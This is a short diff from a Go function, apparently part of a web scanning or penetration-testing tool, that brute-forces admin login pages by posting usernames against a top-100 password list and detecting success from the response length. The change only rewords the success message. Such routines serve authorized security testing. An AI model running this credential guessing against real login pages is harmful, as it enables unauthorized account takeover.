@@ -76,7 +76,7 @@ func Admin_brute(url string) (username string, password string, loginurl string)
 				for passi := range top100pass {
 					if req2, err2 := pkg.HttpRequset(loginurl, "POST", fmt.Sprintf("%s=%s&%s=%s", usernamekey, usernames[useri], passwordkey, top100pass[passi]), false, nil); err2 == nil {
 						if req2.ContentLength != req.ContentLength && !strings.Contains(req2.Body, top100pass[passi]) {
-							fmt.Printf("admin-brute-sucess|%s:%s|%s\n", usernames[useri], top100pass[passi], loginurl)
+							fmt.Printf("[+] Found admin password|%s:%s|%s\n", usernames[useri], top100pass[passi], loginurl)
 							return usernames[useri], top100pass[passi], loginurl
 						}
 					}
